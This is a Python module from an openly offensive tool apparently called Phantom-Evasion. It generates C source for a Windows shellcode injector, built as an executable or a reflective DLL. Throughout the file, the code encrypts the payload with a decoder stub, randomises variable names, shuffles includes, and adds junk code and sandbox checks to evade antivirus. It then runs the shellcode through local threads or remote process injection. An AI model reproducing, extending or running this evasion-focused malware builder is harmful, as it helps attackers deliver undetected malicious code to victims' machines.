
     ########################################################################################
     #                                                                                      #
     #    This file is part of Phantom-Evasion.                                             #
     #                                                                                      #
     #    Phantom-Evasion is free software: you can redistribute it and/or modify           #
     #    it under the terms of the GNU General Public License as published by              #
     #    the Free Software Foundation, either version 3 of the License, or                 #
     #    (at your option) any later version.                                               #
     #                                                                                      #
     #    Phantom-Evasion is distributed in the hope that it will be useful,                #
     #    but WITHOUT ANY WARRANTY; without even the implied warranty of                    #
     #    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                     #
     #    GNU General Public License for more details.                                      #
     #                                                                                      #  
     #    You should have received a copy of the GNU General Public License                 #
     #    along with Phantom-Evasion.  If not, see <http://www.gnu.org/licenses/>.          #
     #                                                                                      #
     ########################################################################################

import sys
sys.path.append("Modules/payloads/auxiliar")

import inject_utils
from usefull import EncryptionManager
from usefull import varname_creator
from usefull import JunkInjector
from usefull import WindowsDefend
from usefull import IncludeShuffler
#from usefull import WindowsDecoyProc
#from usefull import CloseDecoyProc
from usefull import Remote_methods
from usefull import WriteSource

def ShellInject_C_windows(ModOpt):

    Randbufname = varname_creator()
    Randlpv = varname_creator()
    Randhand = varname_creator()
    Randresult = varname_creator()
    Randthread = varname_creator()
    Oldprot = varname_creator()
    Randbool = varname_creator()
    Ndcvirtualpro = varname_creator()
    ResThread = varname_creator()

    Payload = ModOpt["Payload"]
    Encryption = ModOpt["Encode"]
    Arch = ModOpt["Arch"]
    MemAlloc = ModOpt["MemAlloc"]
    ExecMethod = ModOpt["ExecMethod"]
    ModOpt["Buff"] = Randbufname
    ModOpt["Lpvoid"] = Randlpv
    #ModOpt["Lpvoid2"] = varname_creator()

    #if ModOpt["ExecMethod"] not in Remote_methods or ModOpt["MemAlloc"] in ["SharedSection","SS"]:

    if ExecMethod not in Remote_methods: #["EntryPointHijack","EPH","EarlyBird","EB"]:

        DecodeKit = EncryptionManager(Encryption,Payload,Randbufname,Randlpv)
    else:
        DecodeKit = EncryptionManager(Encryption,Payload,Randbufname)        

    ModOpt["Payload"] = DecodeKit[0] # encoded shellcode 
    ModOpt["Decoder"] = DecodeKit[1] # decoder stub or string = False if decoder is not necessary

    Ret_code = ""

    IncludeList = ["#include <windows.h>\n","#include <stdio.h>\n","#include <string.h>\n","#include <math.h>\n","#include <time.h>\n"]

    Ret_code += IncludeShuffler(IncludeList)
    Ret_code += "#include <tlhelp32.h>\n"
    
    if ModOpt["Outformat"] == "exe":

        Ret_code += "int main(int argc,char * argv[]){\n"

    elif ModOpt["Outformat"] == "dll":

        if ModOpt["Reflective"] == True:

            Ret_code += "#include \"ReflectiveLoader.h\"\n"
        
        Ret_code += "BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD dwReason,LPVOID lpReserved){\n"
        Ret_code += "BOOL bReturnValue = TRUE;\n"

        Ret_code += "if(dwReason ==  DLL_PROCESS_ATTACH){\n"

    if ModOpt["DynImport"] == True:

        ModOpt["NtdllHandle"] = varname_creator()
        ModOpt["Ker32Handle"] = varname_creator()

        Ret_code += "HANDLE " + ModOpt["NtdllHandle"] + " = GetModuleHandle(\"ntdll.dll\");\n"
        Ret_code += "HANDLE " + ModOpt["Ker32Handle"] + " = GetModuleHandle(\"kernel32.dll\");\n"

    Ret_code += "$:START\n"

    Ret_code += WindowsDefend(ModOpt)

    #Ret_code += WindowsDecoyProc(ModOpt["DecoyProc"])

    Ret_code += "$:EVA\n"

    Ret_code += inject_utils.ShellcodeHelper(ModOpt)

    if ModOpt["ExecMethod"] not in Remote_methods:

        Ret_code += "unsigned char * " + Randlpv + ";\n" 
        Ret_code += inject_utils.Win_MemLocal(ModOpt)

        if ModOpt["DynImport"] == True:
        
             Ndcrtlmovemem = varname_creator() 
             Ret_code += "FARPROC " + Ndcrtlmovemem + " = GetProcAddress(" + ModOpt["NtdllHandle"] + ", \"RtlMoveMemory\");\n"
             Ret_code += Ndcrtlmovemem + "(" + Randlpv + "," + Randbufname + "," + ModOpt["Bufflen"] + ");\n"
        else:
             Ret_code += "RtlMoveMemory(" + Randlpv + "," + Randbufname + "," + ModOpt["Bufflen"] + ");\n"

        if ModOpt["Decoder"] != "False":

            Ret_code += ModOpt["Decoder"]

        if "RW/" in MemAlloc and ExecMethod in ["Thread","APC"]:

            Ret_code += inject_utils.Win_ChangeMemProtect(ModOpt)

        Ret_code += inject_utils.Win_LocalThread(ModOpt)
    else:
        #ModOpt["Lpvoid"] = ModOpt["Buff"]
        Ret_code += inject_utils.Win_RemoteInjection(ModOpt)

    Ret_code += "$:END\n"

    #Ret_code += CloseDecoyProc(ModOpt["DecoyProc"])

    Ret_code = JunkInjector(Ret_code,ModOpt["JI"],ModOpt["JF"],ModOpt["EF"],ModOpt["JR"])

    if ModOpt["Outformat"] == "exe":

        Ret_code += "return 0;}"

    elif ModOpt["Outformat"] == "dll":
        
        Ret_code += "}\n"
        Ret_code += "return bReturnValue;}\n"

    WriteSource("Source.c",Ret_code)


